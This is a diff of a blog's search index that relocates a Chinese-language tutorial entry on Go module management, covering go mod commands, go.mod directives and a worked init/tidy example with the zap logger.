     <content><![CDATA[<p>GOPATH下的src目录就是接下来开发程序的主要目录，所有的源码都是放在这个目录下面，那么一般我们的做法就是一个目录一个项目，例如: $GOPATH/src/mymath 表示mymath这个应用包或者可执行应用，这个根据package是main还是其他来决定，main的话就是可执行应用，其他的话就是应用包</p>
@@ -2228,6 +2272,94 @@
 <blockquote>
 <p>每一个可独立运行的Go程序，必定包含一个<code>package main</code>，在这个<code>main</code>包中必定包含一个入口函数<code>main</code>，而这个函数既没有参数，也没有返回值。</p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>go</category>
+      </categories>
+      <tags>
+        <tag>go</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>golang mod包管理</title>
+    <url>/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<p>环境变量 GO111MODULE=on 时， go modules 功能开启，go依赖包的存放和查找位置为</p>
+<blockquote>
+<p>$GOPATH/pkg/mod</p>
+</blockquote>
+<p>golang提供了 go mod 命令来使⽤ go modules 管理包</p>
+<p>开启 go modules 功能后的包查找路径为<code>项⽬⽬录/vendor</code>-&gt;<code>$GOPATH/pkg/mod</code></p>
+<p>该⽅式下go项⽬源码不⼀定要保存在<code>$GOPATH/src</code>⽬录下</p>
+<p>mod命令</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>download</td>
+<td>下载依赖包</td>
+</tr>
+<tr>
+<td>init</td>
+<td>初始化go.mod</td>
+</tr>
+<tr>
+<td>verify</td>
+<td>在当前目录初始化mod</td>
+</tr>
+<tr>
+<td>edit</td>
+<td>编辑go.mod</td>
+</tr>
+<tr>
+<td>tidy</td>
+<td>拉取缺少的模块，移除不⽤的模块</td>
+</tr>
+<tr>
+<td>graph</td>
+<td>打印模块依赖图</td>
+</tr>
+<tr>
+<td>vendor</td>
+<td>将依赖复制到项目的vendor目录下</td>
+</tr>
+<tr>
+<td>verify</td>
+<td>验证依赖是否正确</td>
+</tr>
+</tbody>
+</table>
+<p>使用示例：</p>
+<p>现有源文件如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">main.go</span><br><span class="line"></span><br><span class="line">$ cat main.go</span><br><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">	&quot;go.uber.org&#x2F;zap&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">    logger, _ :&#x3D; zap.NewProduction()</span><br><span class="line">    defer logger.Sync()</span><br><span class="line">    sugar :&#x3D; logger.Sugar()</span><br><span class="line">    sugar.Info(&quot;hello world&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在项⽬⽬录下使⽤<code>go mod init</code>初始化项⽬，后⾯可以跟包名</p>
+<p>如<code>go mod init github.com/jacksonyoudi/gomodone</code></p>
+<p>此时项⽬⽬录下多出了<code>go.mod</code>⽂件，但⽂件中还没有描述任何引⼊包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go mod init</span><br><span class="line">go: creating new go.mod: module helloworld</span><br><span class="line">$ ls</span><br><span class="line">go.mod main.go</span><br><span class="line">$ cat go.mod</span><br><span class="line">module helloworld</span><br><span class="line">go 1.16</span><br></pre></td></tr></table></figure>
+<p>使⽤<code>go mod tidy</code>更新项⽬中的依赖包，此时源⽂件中的zap包被加⼊到mod⽂件中，且⽣成了最新的<code>go.sum</code>⽂件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go mod tidy</span><br><span class="line">go: finding module for package go.uber.org&#x2F;zap</span><br><span class="line">go: found go.uber.org&#x2F;zap in go.uber.org&#x2F;zap v1.17.0</span><br><span class="line">$ ls</span><br><span class="line">go.mod go.sum main.go</span><br><span class="line">$ cat go.mod</span><br><span class="line">module helloworld</span><br><span class="line">go 1.16</span><br><span class="line">require go.uber.org&#x2F;zap v1.17.0</span><br></pre></td></tr></table></figure>
+<p>go.mod⽂件⼀旦创建后，它的内容将会被go toolchain全⾯掌控。</p>
+<p>go toolchain会在各类命令（如go get、go build、go mod等）执⾏时，修改和维护go.mod⽂件</p>
+<blockquote>
+<p>go.mod 提供了 <code>module</code>、<code>require</code>、<code>replace</code> 和 <code>exclude</code> 四个命令</p>
+<p><code>module</code> 语句指定包的名字（路径）</p>
+<p><code>require</code> 语句指定的依赖项模块（常用）</p>
+<p><code>replace</code> 语句可以替换依赖项模块（常用)</p>
+<p><code>exclude</code> 语句可以忽略依赖项模块</p>
+</blockquote>
+<p>⼀个典型go.mod⽂件</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">module golang_exp</span><br><span class="line"><span class="keyword">go</span> <span class="number">1.16</span></span><br><span class="line">require (</span><br><span class="line">    github.com/valyala/fasthttp v1<span class="number">.26</span><span class="number">.0</span></span><br><span class="line">    <span class="keyword">go</span>.etcd.io/bbolt v1<span class="number">.3</span><span class="number">.5</span></span><br><span class="line">    golang.org/x/net v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20210521195947</span>-fe42d452be8f</span><br><span class="line">    golang.org/x/sys v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20210521203332</span><span class="number">-0</span>cec03c779c1</span><br><span class="line">    google.golang.org/genproto v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20210524171403</span><span class="number">-669157292</span>da3</span><br><span class="line">    google.golang.org/grpc v1<span class="number">.38</span><span class="number">.0</span></span><br><span class="line">)</span><br><span class="line">replace (</span><br><span class="line">    <span class="comment">//使用本地包来替换导入包</span></span><br><span class="line">    <span class="comment">//包导入名 =&gt; 本地包相对路径/绝对路径</span></span><br><span class="line">    firstgo/packagetest1 =&gt; ../packagetest1</span><br><span class="line">    firstgo/packagetest2 =&gt; ../packagetest2</span><br><span class="line">    </span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>导入本地<code>module</code>:<a href="https://www.cnblogs.com/sebuntin2020/p/12435343.html">https://www.cnblogs.com/sebuntin2020/p/12435343.html</a></p>
+<p>import 如下</p>
+<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150318009.png" alt="image-20210713150318009"></p>
+<p>go.mod 如下</p>
+<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150712969.png" alt="image-20210713150712969"></p>
+<p>之所以要是 <a href="http://github.com/myModule">github.com/myModule</a> 的格式，是因为在 go1.13及以上版本 中， go module 名称规范要求路径的第一部分必须满足域名规范，否则可能会报类似 <code>malformed module path &quot;myModule&quot;: missing dot in first path element</code> 这样的错误。</p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -2318,94 +2450,6 @@ num = 4<br>
       <tags>
         <tag>go</tag>
         <tag>并发</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>golang mod包管理</title>
-    <url>/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<p>环境变量 GO111MODULE=on 时， go modules 功能开启，go依赖包的存放和查找位置为</p>
-<blockquote>
-<p>$GOPATH/pkg/mod</p>
-</blockquote>
-<p>golang提供了 go mod 命令来使⽤ go modules 管理包</p>
-<p>开启 go modules 功能后的包查找路径为<code>项⽬⽬录/vendor</code>-&gt;<code>$GOPATH/pkg/mod</code></p>
-<p>该⽅式下go项⽬源码不⼀定要保存在<code>$GOPATH/src</code>⽬录下</p>
-<p>mod命令</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>download</td>
-<td>下载依赖包</td>
-</tr>
-<tr>
-<td>init</td>
-<td>初始化go.mod</td>
-</tr>
-<tr>
-<td>verify</td>
-<td>在当前目录初始化mod</td>
-</tr>
-<tr>
-<td>edit</td>
-<td>编辑go.mod</td>
-</tr>
-<tr>
-<td>tidy</td>
-<td>拉取缺少的模块，移除不⽤的模块</td>
-</tr>
-<tr>
-<td>graph</td>
-<td>打印模块依赖图</td>
-</tr>
-<tr>
-<td>vendor</td>
-<td>将依赖复制到项目的vendor目录下</td>
-</tr>
-<tr>
-<td>verify</td>
-<td>验证依赖是否正确</td>
-</tr>
-</tbody>
-</table>
-<p>使用示例：</p>
-<p>现有源文件如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">main.go</span><br><span class="line"></span><br><span class="line">$ cat main.go</span><br><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">	&quot;go.uber.org&#x2F;zap&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">    logger, _ :&#x3D; zap.NewProduction()</span><br><span class="line">    defer logger.Sync()</span><br><span class="line">    sugar :&#x3D; logger.Sugar()</span><br><span class="line">    sugar.Info(&quot;hello world&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在项⽬⽬录下使⽤<code>go mod init</code>初始化项⽬，后⾯可以跟包名</p>
-<p>如<code>go mod init github.com/jacksonyoudi/gomodone</code></p>
-<p>此时项⽬⽬录下多出了<code>go.mod</code>⽂件，但⽂件中还没有描述任何引⼊包</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go mod init</span><br><span class="line">go: creating new go.mod: module helloworld</span><br><span class="line">$ ls</span><br><span class="line">go.mod main.go</span><br><span class="line">$ cat go.mod</span><br><span class="line">module helloworld</span><br><span class="line">go 1.16</span><br></pre></td></tr></table></figure>
-<p>使⽤<code>go mod tidy</code>更新项⽬中的依赖包，此时源⽂件中的zap包被加⼊到mod⽂件中，且⽣成了最新的<code>go.sum</code>⽂件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go mod tidy</span><br><span class="line">go: finding module for package go.uber.org&#x2F;zap</span><br><span class="line">go: found go.uber.org&#x2F;zap in go.uber.org&#x2F;zap v1.17.0</span><br><span class="line">$ ls</span><br><span class="line">go.mod go.sum main.go</span><br><span class="line">$ cat go.mod</span><br><span class="line">module helloworld</span><br><span class="line">go 1.16</span><br><span class="line">require go.uber.org&#x2F;zap v1.17.0</span><br></pre></td></tr></table></figure>
-<p>go.mod⽂件⼀旦创建后，它的内容将会被go toolchain全⾯掌控。</p>
-<p>go toolchain会在各类命令（如go get、go build、go mod等）执⾏时，修改和维护go.mod⽂件</p>
-<blockquote>
-<p>go.mod 提供了 <code>module</code>、<code>require</code>、<code>replace</code> 和 <code>exclude</code> 四个命令</p>
-<p><code>module</code> 语句指定包的名字（路径）</p>
-<p><code>require</code> 语句指定的依赖项模块（常用）</p>
-<p><code>replace</code> 语句可以替换依赖项模块（常用)</p>
-<p><code>exclude</code> 语句可以忽略依赖项模块</p>
-</blockquote>
-<p>⼀个典型go.mod⽂件</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">module golang_exp</span><br><span class="line"><span class="keyword">go</span> <span class="number">1.16</span></span><br><span class="line">require (</span><br><span class="line">    github.com/valyala/fasthttp v1<span class="number">.26</span><span class="number">.0</span></span><br><span class="line">    <span class="keyword">go</span>.etcd.io/bbolt v1<span class="number">.3</span><span class="number">.5</span></span><br><span class="line">    golang.org/x/net v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20210521195947</span>-fe42d452be8f</span><br><span class="line">    golang.org/x/sys v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20210521203332</span><span class="number">-0</span>cec03c779c1</span><br><span class="line">    google.golang.org/genproto v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20210524171403</span><span class="number">-669157292</span>da3</span><br><span class="line">    google.golang.org/grpc v1<span class="number">.38</span><span class="number">.0</span></span><br><span class="line">)</span><br><span class="line">replace (</span><br><span class="line">    <span class="comment">//使用本地包来替换导入包</span></span><br><span class="line">    <span class="comment">//包导入名 =&gt; 本地包相对路径/绝对路径</span></span><br><span class="line">    firstgo/packagetest1 =&gt; ../packagetest1</span><br><span class="line">    firstgo/packagetest2 =&gt; ../packagetest2</span><br><span class="line">    </span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<p>导入本地<code>module</code>:<a href="https://www.cnblogs.com/sebuntin2020/p/12435343.html">https://www.cnblogs.com/sebuntin2020/p/12435343.html</a></p>
-<p>import 如下</p>
-<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150318009.png" alt="image-20210713150318009"></p>
-<p>go.mod 如下</p>
-<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150712969.png" alt="image-20210713150712969"></p>
-<p>之所以要是 <a href="http://github.com/myModule">github.com/myModule</a> 的格式，是因为在 go1.13及以上版本 中， go module 名称规范要求路径的第一部分必须满足域名规范，否则可能会报类似 <code>malformed module path &quot;myModule&quot;: missing dot in first path element</code> 这样的错误。</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>go</category>
-      </categories>
-      <tags>
-        <tag>go</tag>
       </tags>
   </entry>
 </search>
